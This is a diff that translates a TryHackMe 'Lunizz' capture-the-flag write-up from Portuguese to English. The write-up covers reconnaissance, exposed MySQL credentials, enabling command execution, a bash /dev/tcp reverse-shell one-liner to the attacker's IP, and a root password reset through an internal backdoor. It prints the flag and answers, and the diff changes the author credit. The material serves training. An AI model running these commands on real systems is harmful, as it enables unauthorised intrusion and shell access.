@@ -1,54 +1,54 @@
 # Lunizz CTF — TryHackMe Writeup
 
-**Plataforma:** TryHackMe  
-**Dificuldade:** Iniciante/Intermediário  
-**Objetivo:** Obter `user.txt` e `root.txt`
+**Platform:** TryHackMe  
+**Difficulty:** Beginner/Intermediate  
+**Objective:** Obtain `user.txt` and `root.txt`
 
 ---
 
-## Sumário
+## Table of Contents
 
-1. [Reconhecimento](#1-reconhecimento)
-2. [Enumeração Web](#2-enumeração-web)
-3. [Porta 4444 — Challenge-Response](#3-porta-4444--challenge-response)
-4. [Acesso ao MySQL](#4-acesso-ao-mysql)
+1. [Reconnaissance](#1-reconnaissance)
+2. [Web Enumeration](#2-web-enumeration)
+3. [Port 4444 — Challenge-Response](#3-port-4444--challenge-response)
+4. [MySQL Access](#4-mysql-access)
 5. [RCE — Command Executer](#5-rce--command-executer)
 6. [Reverse Shell](#6-reverse-shell)
-7. [Enumeração Pós-Acesso](#7-enumeração-pós-acesso)
-8. [Escalação Horizontal — mason](#8-escalação-horizontal--mason)
-9. [Escalação Vertical — root](#9-escalação-vertical--root)
+7. [Post-Exploitation Enumeration](#7-post-exploitation-enumeration)
+8. [Horizontal Escalation — mason](#8-horizontal-escalation--mason)
+9. [Vertical Escalation — root](#9-vertical-escalation--root)
 10. [Flags](#10-flags)
-11. [Respostas do CTF](#11-respostas-do-ctf)
-12. [Lições Aprendidas](#12-lições-aprendidas)
+11. [CTF Answers](#11-ctf-answers)
+12. [Key Takeaways](#12-key-takeaways)
 
 ---
 
-## 1. Reconhecimento
+## 1. Reconnaissance
 
-### Nmap — Varredura Completa
+### Nmap — Full Scan
 
 ```bash
 nmap -p- --min-rate 5000 -sC -sV -oN lunizz.txt <IP>
 ```
 
-**Resultado:**
+**Results:**
 
-| Porta | Serviço | Versão | Observação |
-|-------|---------|--------|------------|
-| 22 | SSH | OpenSSH 8.2p1 | Acesso remoto |
+| Port | Service | Version | Notes |
+|------|---------|---------|-------|
+| 22 | SSH | OpenSSH 8.2p1 | Remote access |
 | 80 | HTTP | Apache 2.4.41 | Default page |
-| 3306 | MySQL | 8.0.42 | Exposto externamente |
-| 4444 | Custom | — | Challenge-response Base64 |
-| 5000 | "SSH" | OpenSSH 5.1 | Falso — descartado |
-| 33060 | MySQL X | — | Protocolo secundário |
+| 3306 | MySQL | 8.0.42 | Exposed externally |
+| 4444 | Custom | — | Base64 challenge-response |
+| 5000 | "SSH" | OpenSSH 5.1 | Fake — discarded |
+| 33060 | MySQL X | — | Secondary protocol |
 
-> **Destaque:** MySQL exposto na porta 3306 é incomum. A porta 4444 retorna mensagens suspeitas no banner — alto potencial de exploração.
+> **Highlight:** MySQL exposed on port 3306 is unusual. Port 4444 returns suspicious messages in its banner — high exploitation potential.
 
 ---
 
-## 2. Enumeração Web
+## 2. Web Enumeration
 
-### Fuzzing de Diretórios
+### Directory Fuzzing
 
 ```bash
 ffuf -u http://<IP>/FUZZ \
@@ -56,18 +56,18 @@ ffuf -u http://<IP>/FUZZ \
   -mc 200,301,302
 ```
 
-**Resultados relevantes:**
+**Relevant results:**
 
-| Caminho | Status | Descrição |
-|---------|--------|-----------|
-| `/whatever/index.php` | 200 | Command Executer (desabilitado) |
-| `/hidden/index.php` | 200 | Upload de imagens |
-| `/hidden/uploads/` | 403 | Pasta de uploads |
-| `/instructions.txt` | 200 | 🔥 Credenciais expostas |
+| Path | Status | Description |
+|------|--------|-------------|
+| `/whatever/index.php` | 200 | Command Executer (disabled) |
+| `/hidden/index.php` | 200 | Image upload |
+| `/hidden/uploads/` | 403 | Uploads folder |
+| `/instructions.txt` | 200 | 🔥 Exposed credentials |
 
 ### instructions.txt
 
-Acessando `http://<IP>/instructions.txt`:
+Accessing `http://<IP>/instructions.txt`:
 
 ```
 Made By CTF_SCRIPTS_CAVE (not real)
@@ -81,21 +81,21 @@ Thanks for installing our ctf script
 please do not use default creds (IT'S DANGEROUS)
 ```
 
-> **Credenciais MySQL obtidas:** `runcheck:CTF_script_cave_changeme`
+> **MySQL credentials obtained:** `runcheck:CTF_script_cave_changeme`
 
 ---
 
-## 3. Porta 4444 — Challenge-Response
+## 3. Port 4444 — Challenge-Response
 
-Conectando com `nc`:
+Connecting with `nc`:
 
 ```bash
 nc <IP> 4444
 ```
 
-O serviço retorna strings em **Base64** pedindo que sejam decodificadas. A string muda a cada conexão.
+The service returns **Base64** strings asking them to be decoded. The string changes with each connection.
 
-Decodificando as strings capturadas pelo Nmap e pelo código fonte da `index.html`:
+Decoding the strings captured by Nmap and from the `index.html` source code:
 
 ```bash
 echo "cEBzc3dvcmQ=" | base64 -d
@@ -108,20 +108,20 @@ echo "bGV0bWVpbg==" | base64 -d
 # letmein
 ```
 
-> **Credenciais descobertas:** `p@ssword`, `extremesecurerootpassword`, `letmein`  
-> **Nota:** O shell retornado pela porta 4444 é falso — aceita a senha mas bloqueia todos os comandos com `FATAL ERROR`.
+> **Discovered credentials:** `p@ssword`, `extremesecurerootpassword`, `letmein`  
+> **Note:** The shell returned by port 4444 is fake — it accepts the password but blocks all commands with `FATAL ERROR`.
 
 ---
 
-## 4. Acesso ao MySQL
+## 4. MySQL Access
 
-Usando as credenciais do `instructions.txt`:
+Using the credentials from `instructions.txt`:
 
 ```bash
 mysql -h <IP> -u runcheck -p'CTF_script_cave_changeme' --skip-ssl
 ```
 
-### Enumerando o banco
+### Enumerating the database
 
 ```sql
 show databases;
@@ -137,15 +137,15 @@ select * from runcheck;
 update runcheck set run = 1;
 ```
 
-> A coluna `run` controla se o Command Executer na aplicação web está habilitado ou não.
+> The `run` column controls whether the Command Executer in the web application is enabled or not.
 
 ---
 
 ## 5. RCE — Command Executer
 
-Após setar `run = 1` no banco, o `/whatever/index.php` passou a exibir **"Command Executer Mode :1"** e a executar comandos do sistema como `www-data`.
+After setting `run = 1` in the database, `/whatever/index.php` started displaying **"Command Executer Mode :1"** and executing system commands as `www-data`.
 
-**Comandos executados para reconhecimento:**
+**Reconnaissance commands:**
 
 ```
 whoami        → www-data
@@ -157,25 +157,25 @@ ls /
 
 ## 6. Reverse Shell
 
-### Preparação no Kali
+### Setting up the listener on Kali
 
 ```bash
 nc -lvnp 4444
 ```
 
-### Payload no Command Executer
+### Payload in the Command Executer
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/<SEU_IP_TUN0>/4444 0>&1'
+bash -c 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1'
 ```
 
-Shell obtido como `www-data`:
+Shell obtained as `www-data`:
 
 ```
 www-data@ip-10-67-129-54:/var/www/html/whatever$
 ```
 
-### Upgrade do shell
+### Shell upgrade
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -183,40 +183,40 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ---
 
-## 7. Enumeração Pós-Acesso
+## 7. Post-Exploitation Enumeration
 
-### Pasta não padrão na raiz
+### Non-standard folder at the root
 
 ```bash
 ls /
 # ...
-# proct  ← pasta suspeita
+# proct  ← suspicious folder
 ```
 
-### Arquivo de hashing
+### Hashing script
 
 ```bash
 ls /proct/pass/
 cat /proct/pass/bcrypt_encryption.py
 ```
 
-O arquivo continha a lógica de hashing **Base64 + Bcrypt** usada para a senha do usuário `adam`, além de revelar a pista:
+The file contained the **Base64 + Bcrypt** hashing logic used for the `adam` user's password, and also revealed the hint:
 
 > *"hi adam, do you remember our place?"*  
-> **Resposta:** `northern lights`
+> **Answer:** `northern lights`
 
 ---
 
-## 8. Escalação Horizontal — mason
+## 8. Horizontal Escalation — mason
 
-A senha do usuário `mason` era baseada na mesma pista das Northern Lights:
+The `mason` user's password was based on the same Northern Lights hint:
 
 ```bash
 su mason
-# senha: northernlights
+# password: northernlights
 ```
 
-### Flag de usuário
+### User flag
 
 ```bash
 cat /home/mason/user.txt
@@ -226,24 +226,24 @@ cat /home/mason/user.txt
 
 ---
 
-## 9. Escalação Vertical — root
+## 9. Vertical Escalation — root
 
-### Backdoor interno na porta 8080
+### Internal backdoor on port 8080
 
-Enumerando serviços internos, foi identificado um backdoor rodando em `localhost:8080`:
+Enumerating internal services, a backdoor was identified running on `localhost:8080`:
 
 ```bash
 curl -X POST http://localhost:8080 \
   -d "password=northernlights&cmdtype=passwd"
 ```
 
-O backdoor (Mason's Root Backdoor) **resetou a senha do root** para `northernlights`.
+The backdoor (Mason's Root Backdoor) **reset the root password** to `northernlights`.
 
-### Acesso root
+### Root access
 
 ```bash
 su root
-# senha: northernlights
+# password: northernlights
 
 cat /root/root.txt
 ```
@@ -252,17 +252,17 @@ cat /root/root.txt
 
 ## 10. Flags
 
-| Flag | Valor |
+| Flag | Value |
 |------|-------|
 | user.txt | `thm{23cd53cbb37a37a74d4425b703d91883}` |
-| root.txt | *(obtida em `/root/root.txt`)* |
+| root.txt | *(obtained at `/root/root.txt`)* |
 
 ---
 
-## 11. Respostas do CTF
+## 11. CTF Answers
 
-| Pergunta | Resposta |
-|----------|----------|
+| Question | Answer |
+|----------|--------|
 | What is the default password for mysql? | `CTF_script_cave_changeme` |
 | MySQL column that controls command executer | `run` |
 | A folder shouldn't be... | `proct` |
@@ -270,37 +270,37 @@ cat /root/root.txt
 
 ---
 
-## 12. Lições Aprendidas
+## 12. Key Takeaways
 
-### Credenciais em arquivos públicos
-O arquivo `instructions.txt` estava acessível via web e continha credenciais de banco de dados em texto claro — nunca deixe arquivos de configuração ou instruções expostos no servidor web.
+### Credentials in public files
+The `instructions.txt` file was accessible via the web and contained database credentials in plaintext — never leave configuration files or setup instructions exposed on the web server.
 
-### Encoding ≠ Criptografia
-Base64 é apenas uma forma de representar dados — qualquer pessoa pode decodificar sem chave. Não use Base64 para proteger senhas ou informações sensíveis.
+### Encoding ≠ Encryption
+Base64 is just a way to represent data — anyone can decode it without a key. Never use Base64 to protect passwords or sensitive information.
 
-### Controle de acesso via banco de dados
-A aplicação usava uma coluna do MySQL para habilitar/desabilitar funcionalidades críticas. Controle de acesso não deve depender de um valor facilmente alterável no banco.
+### Access control via database
+The application used a MySQL column to enable/disable critical functionality. Access control should never depend on a value that can be easily changed in the database.
 
-### Backdoors internos
-Serviços rodando em `localhost` não são visíveis externamente, mas uma vez obtido RCE, o atacante tem acesso completo à rede interna da máquina.
+### Internal backdoors
+Services running on `localhost` are not visible externally, but once RCE is obtained, the attacker has full access to the machine's internal network.
 
-### Reutilização de senhas
-A mesma senha (`northernlights`) foi usada pelo usuário `mason` e pelo backdoor root — nunca reutilize senhas entre sistemas e usuários.
-
----
-
-## Ferramentas Utilizadas
-
-| Ferramenta | Uso |
-|------------|-----|
-| `nmap` | Reconhecimento de portas e serviços |
-| `ffuf` | Fuzzing de diretórios web |
-| `mysql` | Acesso e manipulação do banco de dados |
-| `BurpSuite` | Interceptação e modificação de requisições HTTP |
-| `nc` (netcat) | Reverse shell e interação com a porta 4444 |
-| `base64` | Decodificação de strings |
-| `curl` | Interação com o backdoor interno |
+### Password reuse
+The same password (`northernlights`) was used by the `mason` user and the root backdoor — never reuse passwords across systems and users.
 
 ---
 
-*Writeup por: Voltiban | TryHackMe | Lunizz CTF*
+## Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Port and service reconnaissance |
+| `ffuf` | Web directory fuzzing |
+| `mysql` | Database access and manipulation |
+| `BurpSuite` | HTTP request interception and modification |
+| `nc` (netcat) | Reverse shell and port 4444 interaction |
+| `base64` | String decoding |
+| `curl` | Internal backdoor interaction |
+
+---
+
+*Writeup by: Lindomar | TryHackMe | Lunizz CTF*
